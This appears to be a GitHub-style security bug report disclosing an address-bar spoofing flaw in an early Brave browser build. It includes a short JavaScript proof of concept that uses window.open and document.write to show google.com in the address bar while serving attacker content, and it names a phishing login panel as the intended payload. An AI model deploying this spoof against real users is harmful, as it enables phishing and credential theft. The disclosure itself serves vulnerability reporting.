@@ -1,0 +1,39 @@
+[Security Issue] Address Bar Spoofing
+
+
+Did you search for similar issues before submitting this one?
+Yes
+Describe the issue you encountered:
+It's possible to spoof the URL that is shown in the address bar by opening a new window and writing to it using document.write.
+Expected behavior:
+The browser to show the real location instead of the spoofed one.
+Platform (Win7, 8, 10? macOS? Linux distro?):
+Ubuntu 16.04 LTS
+Brave Version:
+
+Brave: 0.11.1
+Electron: 1.2.7
+libchromiumcontent: 51.0.2704.103
+V8: 5.1.281.65
+Node.js: 6.1.0
+Update Channel: dev
+
+Steps to reproduce:
+1. Place this code into an .html file in your server:
+<script>
+    function spoof() {
+        nWindow = window.open('https:/www.google.com');
+        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
+}
+</script>
+<input type="button" onclick="spoof()" value="PoC!">
+The page is being hosted in my server
+
+Open it using Brave Browser.
+Click the button, then the URL will be `https://www.google.com/` but the real location will be your server.
+
+Screenshot if needed:
+
+Any related issues:
+Same bug in Chrome for Android
+Kind regards.
